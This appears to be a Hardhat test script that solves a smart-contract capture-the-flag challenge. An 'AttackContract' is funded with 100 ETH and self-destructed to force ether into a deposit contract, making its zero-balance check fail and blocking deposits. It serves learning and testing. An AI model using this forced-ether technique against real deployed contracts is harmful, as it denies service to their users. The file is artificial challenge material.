const { expect } = require("chai");
const hre = require("hardhat");

describe("JTChallenge test", function () {
  let owner, attacker, jtChallenge, jtChallengeDeposit, attackContract;

  before(async function () {
    // Get signers
    [owner, attacker] = await hre.ethers.getSigners();

    // Deploy and verify the JTChallenge contract
    jtChallenge = await hre.run("deploy", { contract: "JTChallenge" });
    
    // Deploy and verify the JTChallengeDeposit contract
    jtChallengeDeposit = await hre.run("deploy", { contract: "JTChallengeDeposit" });

    // Deploy and verify the AttackContract
    attackContract = await hre.run("deploy", { contract: "AttackContract" });
  });

  it("Deposit 1 token to JTChallengeDeposit successfully", async function () {
    // Approve the JTChallengeDeposit contract to spend the owner's tokens
    const maxApproval = hre.ethers.constants.MaxUint256;
    await jtChallenge.approve(jtChallengeDeposit.address, maxApproval);

    // Call the deposit function on the JTChallengeDeposit contract
    const depositAmount = 1;
    await expect(jtChallengeDeposit.deposit(jtChallenge.address, depositAmount)).to.not.be.reverted;
  });

  it("Deposit function should fail after self-destructing AttackContract and sending its balance to JTChallengeDeposit", async function () {
    // Deposit 100 ETH into the attack contract
    const ethDepositAmount = hre.ethers.utils.parseEther("100");
    console.log("depositing ether into attack contract:", hre.ethers.utils.formatEther(ethDepositAmount), "\n");
    await attackContract.connect(owner).deposit({
      value: ethDepositAmount
    });
    // logging the balance of the attack contract parsed to ether without decimals
    console.log("attack contract balance", hre.ethers.utils.formatEther(await hre.ethers.provider.getBalance(attackContract.address)), "\n");

    // Self-destruct the attack contract and send its balance to the JTChallengeDeposit contract
    console.log("self destructing attack contract and sending balance to jtChallengeDeposit contract", "\n");
    await attackContract.selfDestruct(jtChallengeDeposit.address);

    // logging the balance of the JTChallengeDeposit contract parsed to ether without decimals
    const JTChallengeDeposit_balance = hre.ethers.utils.formatEther(await hre.ethers.provider.getBalance(jtChallengeDeposit.address));
    if (JTChallengeDeposit_balance > 0) {
      console.log("JTChallengeDeposit contract balance", JTChallengeDeposit_balance, "\n");
    }

    // Attempt to call the deposit function on the JTChallengeDeposit contract, which should fail
    const depositAmount = 1;
    console.log("attempting to deposit 1 token to jtChallengeDeposit contract, should fail", "\n");
    try {
      await expect(jtChallengeDeposit.deposit(jtChallenge.address, depositAmount)).to.be.revertedWith("Contract balance must be 0 ETH");
      console.log("Challenge Solved!", "\n");
      console.log("All transactions are available at https://explorer.buildbear.io/furious-palpatine-14d74001", "\n");
    } catch (error) {
      console.log("Challenge Not Solved!", "\n");
    }
  });
});
